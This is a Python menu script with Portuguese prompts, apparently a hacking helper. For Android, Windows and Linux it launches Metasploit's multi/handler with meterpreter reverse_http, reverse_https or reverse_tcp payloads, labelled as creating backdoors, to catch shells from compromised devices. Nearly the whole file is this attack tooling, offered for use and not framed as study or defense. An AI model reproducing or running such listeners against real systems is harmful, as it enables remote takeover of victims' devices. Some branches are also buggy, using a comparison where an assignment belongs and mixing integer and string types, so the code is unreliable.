from os import system

def fun_connect_menu():
    system('clear')
    print("""
[01] - Android 📱️
[02] - Windows 💻️
[03] - linux 🐧️
	""")
    cmd = str(input('➡️  '))
    if cmd == '1':
        system('clear')
        print("""
CREATING ANDROID BACKDOOR 📱️👾️

[01] - android/meterpreter/reverse_http
[02] - android/meterpreter/reverse_https
[03] - android/meterpreter/reverse_tcp
[99] - Exit ❌️	
		""")
        cmd == str(input('➡️  '))
        if cmd == '1':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_http; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '2':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_https; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '3':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '99':
            print('Volte sempre ☺️❤️')
            exit()
    elif cmd == '2':
        system('clear')
        print("""
CREATING WINDOWS BACKDOOR 💻️👾️

[01] - windows/meterpreter/reverse_http
[02] - windows/meterpreter/reverse_https
[03] - windows/meterpreter/reverse_tcp
[99] - Exit ❌️	
		""")
        cmd = str(input('➡️  '))
        if cmd == '1':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '2':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '3':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '99':
            print('Volte sempre ☺️❤️')
            exit()
    elif cmd == '3':
        system('clear')
        print("""
CREATING LINUX BACKDOOR 🐧️👾️

[01] - linux/meterpreter/reverse_http
[02] - linux/meterpreter/reverse_https
[03] - linux/meterpreter/reverse_tcp
[99] - Exit ❌️	
""")
        cmd = int(input('➡️  '))
        if cmd == '1':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/meterpreter/reverse_http; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '2':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/meterpreter/reverse_https; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '3':
            system('clear')
            ip = str(input('Digite o IP (O mesmo que você configurou na backdoor): '))
            port = int(input('Digite a PORTA (O mesmo que você configurou na backdoor): '))
            system(f'msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run"')
        elif cmd == '99':
            print('Volte sempre ☺️❤️')
            exit()